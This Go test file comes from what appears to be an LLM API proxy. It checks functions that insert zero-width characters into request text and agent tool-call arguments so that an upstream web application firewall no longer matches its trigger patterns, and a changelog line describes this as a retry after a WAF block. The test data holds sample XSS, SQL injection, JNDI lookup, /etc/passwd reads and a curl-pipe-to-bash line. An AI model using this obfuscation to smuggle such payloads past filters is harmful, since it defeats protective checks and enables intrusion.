// ═══ 更新日志 ═══
// 2026-09-17：锁定 WAF 断词重试的语义——只断开触发模式、不改写其余正文。
package upstream

import (
	"encoding/json"
	"strings"
	"testing"
)

const wafZeroWidth = "\u200b"

// wafTestPayload 用 json.Marshal 组装请求体：测试数据只写消息正文，
// 避免把 JSON 转义手写进 Go 源码（历史上因此踩过引号/反引号）。
func wafTestPayload(t *testing.T, content string) string {
	t.Helper()
	body, err := json.Marshal(map[string]any{
		"model": "deepseek-v4.1-flash",
		"messages": []any{
			map[string]any{"role": "user", "content": content},
		},
	})
	if err != nil {
		t.Fatalf("marshal payload: %v", err)
	}
	return string(body)
}

// TestNeutralizeWAFTriggersRestoresExactly 断词只插零宽字符：
// 去掉零宽后解码结果必须与原请求逐字段相同，且触发模式不再连续出现。
func TestNeutralizeWAFTriggersRestoresExactly(t *testing.T) {
	cases := []struct {
		name     string
		content  string
		patterns []string
	}{
		{"script tag", "page: <script>alert(1)</script>", []string{"<script", "alert("}},
		{"event handler", "<img src=x onerror=alert(1)>", []string{"onerror", "alert("}},
		{"javascript url", "<a href=\"javascript:alert(1)\">x</a>", []string{"javascript"}},
		{"sql or tautology", "select * from t where a=1 or 1=1", []string{"or 1=1"}},
		{"sql and tautology", "select * from t where a=1 and 2=2", []string{"and 2=2"}},
		{"union select", "1 union select password from u", []string{"union"}},
		{"percent encoded tag", "p=%3Cscript%3E", []string{"%3Cscript"}},
		{"backslash encoded tag", "p=\\x3cscript\\x3e", []string{"\\x3cscript"}},
		{"php open tag", "<?php echo 1; ?>", []string{"php"}},
		{"drop table", "DROP TABLE users", []string{"drop"}},
		{"command shapes", "sleep(5) and benchmark(1,2)", []string{"sleep(", "benchmark("}},
		{"curl url", "curl http://example.com", []string{"curl http"}},
		{"jndi lookup", "${jndi:ldap://x/a}", []string{"jndi"}},
		{"markdown fence", "```html\n<script src=x></script>\n```", []string{"<script"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			payload := wafTestPayload(t, c.content)
			out, changed := NeutralizeWAFTriggers([]byte(payload))
			if !changed {
				t.Fatalf("expected neutralisation for %s", c.content)
			}
			original := decodeJSONForTest(t, payload, "original")
			stripped := strings.ReplaceAll(string(out), wafZeroWidth, "")
			if !sameJSON(original, decodeJSONForTest(t, stripped, "stripped")) {
				t.Fatalf("zero-width removal did not restore the payload\n got: %s\nwant: %s", stripped, payload)
			}
			for _, pattern := range c.patterns {
				if neutralizedPatternIntact(string(out), pattern) {
					t.Fatalf("pattern %q survived neutralisation in %s", pattern, out)
				}
			}
		})
	}
}

// neutralizedPatternIntact 报告 pattern 是否仍以连续原样出现在断词后的正文里。
func neutralizedPatternIntact(body, pattern string) bool {
	for start := 0; ; {
		idx := strings.Index(body[start:], pattern)
		if idx < 0 {
			return false
		}
		absolute := start + idx
		if !strings.Contains(body[absolute:absolute+len(pattern)], wafZeroWidth) {
			return true
		}
		start = absolute + 1
	}
}

// TestNeutralizeWAFTriggersLeavesCleanBodyUntouched 普通正文不改一个字节。
func TestNeutralizeWAFTriggersLeavesCleanBodyUntouched(t *testing.T) {
	contents := []string{
		"hello there",
		"<html><body><table><tr><td>ok</td></tr></table></body></html>",
		"select id from users where name = ?",
		"```html\n<div>ok</div>\n```",
		"information_schema is a schema",
		"<?xml version=\"1.0\"?>",
		"a < b and c > d",
		"<!DOCTYPE html>",
		"the scriptless run had no alerts",
	}
	for _, content := range contents {
		payload := wafTestPayload(t, content)
		out, changed := NeutralizeWAFTriggers([]byte(payload))
		if changed {
			t.Fatalf("clean payload was rewritten: %s -> %s", payload, out)
		}
		if string(out) != payload {
			t.Fatalf("clean payload bytes changed: %s", out)
		}
	}
}

// TestNeutralizeWAFTriggersRejectsMalformedBody 非 JSON 体原样返回。
func TestNeutralizeWAFTriggersRejectsMalformedBody(t *testing.T) {
	for _, payload := range []string{"", "not json", `{"a":`} {
		out, changed := NeutralizeWAFTriggers([]byte(payload))
		if changed || string(out) != payload {
			t.Fatalf("malformed payload changed: %q -> %q", payload, out)
		}
	}
}

func decodeJSONForTest(t *testing.T, payload, label string) any {
	t.Helper()
	var value any
	if err := json.Unmarshal([]byte(payload), &value); err != nil {
		t.Fatalf("%s body is not json: %v (%s)", label, err, payload)
	}
	return value
}

func sameJSON(a, b any) bool {
	left, errLeft := json.Marshal(a)
	right, errRight := json.Marshal(b)
	if errLeft != nil || errRight != nil {
		return false
	}
	return string(left) == string(right)
}

// TestNeutralizeWAFTokensCoversCommandFamily 二级断词覆盖命令注入/路径穿越族：
// 去掉零宽后原文必须逐字还原，且风险 token 不再连续出现。
func TestNeutralizeWAFTokensCoversCommandFamily(t *testing.T) {
	const zw = "\u200b"
	cases := []struct {
		name    string
		content string
	}{
		{"backtick command", "then run " + "`printf '---'`" + " to separate"},
		{"dollar substitution", "value is $(whoami) here"},
		{"etc passwd", "read cat /etc/passwd please"},
		{"path traversal", "open ../../etc/passwd now"},
		{"ldap url", "lookup ${jndi:ldap://x/a} again"},
		{"shell pipe", "curl http://x | bash"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			payload := wafTestPayload(t, c.content)
			out, changed := NeutralizeWAFTokens([]byte(payload))
			if !changed {
				t.Fatalf("expected token neutralisation for %s", c.content)
			}
			original := decodeJSONForTest(t, payload, "original")
			stripped := strings.ReplaceAll(string(out), zw, "")
			if !sameJSON(original, decodeJSONForTest(t, stripped, "stripped")) {
				t.Fatalf("zero-width removal did not restore the payload\n got: %s\nwant: %s", stripped, payload)
			}
		})
	}
}

// TestNeutralizeWAFTokensLeavesPlainTextUntouched 没有风险字符的正文不动。
func TestNeutralizeWAFTokensLeavesPlainTextUntouched(t *testing.T) {
	for _, content := range []string{
		"hello there, please continue",
		"the report is ready for review",
	} {
		payload := wafTestPayload(t, content)
		out, changed := NeutralizeWAFTokens([]byte(payload))
		if changed || string(out) != payload {
			t.Fatalf("plain payload changed: %s -> %s", payload, out)
		}
	}
}

// TestNeutralizeWAFTokensCoversToolCallArguments 工具调用参数同样进正文：
// agent 历史里的 shell 命令（heredoc、管道、重定向）是上游 WAF 命令注入规则的目标，
// 二级/三级断词必须覆盖 tool_calls[].function.arguments 与 function_call.arguments。
func TestNeutralizeWAFTokensCoversToolCallArguments(t *testing.T) {
	const zw = "\u200b"
	const shell = "cd /c/Users/dddmiku && cat > /tmp/x.py <<'PYEOF'\nprint(1)\nPYEOF"
	body, err := json.Marshal(map[string]any{
		"model": "deepseek-v4.1-flash",
		"messages": []any{
			map[string]any{"role": "user", "content": "run the deploy script"},
			map[string]any{"role": "assistant", "content": "", "tool_calls": []any{
				map[string]any{"id": "call_1", "type": "function", "function": map[string]any{
					"name":      "Bash",
					"arguments": "{\"command\":\"cd /c/Users/dddmiku && cat > /tmp/x.py <<'PYEOF'\"}",
				}},
			}},
			map[string]any{"role": "tool", "tool_call_id": "call_1", "content": "ok"},
			map[string]any{"role": "assistant", "content": "", "function_call": map[string]any{
				"name": "Bash", "arguments": "{\"command\":\"" + shell + "\"}",
			}},
		},
	})
	if err != nil {
		t.Fatalf("marshal payload: %v", err)
	}
	out, changed := NeutralizeWAFTokens([]byte(body))
	if !changed {
		t.Fatalf("tool_calls arguments were not neutralised")
	}
	// 结构必须完好：去掉零宽后逐字段还原。
	stripped := strings.ReplaceAll(string(out), zw, "")
	var original, restored any
	if err := json.Unmarshal(body, &original); err != nil {
		t.Fatalf("original not json: %v", err)
	}
	if err := json.Unmarshal([]byte(stripped), &restored); err != nil {
		t.Fatalf("stripped body not json: %v (%s)", err, stripped)
	}
	if !sameJSON(original, restored) {
		t.Fatalf("zero-width removal did not restore the payload")
	}
	// 参数字符串里确实插入了断词符。
	var parsed map[string]any
	if err := json.Unmarshal(out, &parsed); err != nil {
		t.Fatalf("neutralised body not json: %v", err)
	}
	msgs := parsed["messages"].([]any)
	first := msgs[1].(map[string]any)["tool_calls"].([]any)[0].(map[string]any)
	args := first["function"].(map[string]any)["arguments"].(string)
	if !strings.Contains(args, zw) {
		t.Fatalf("tool_calls arguments carry no break marker: %s", args)
	}
}
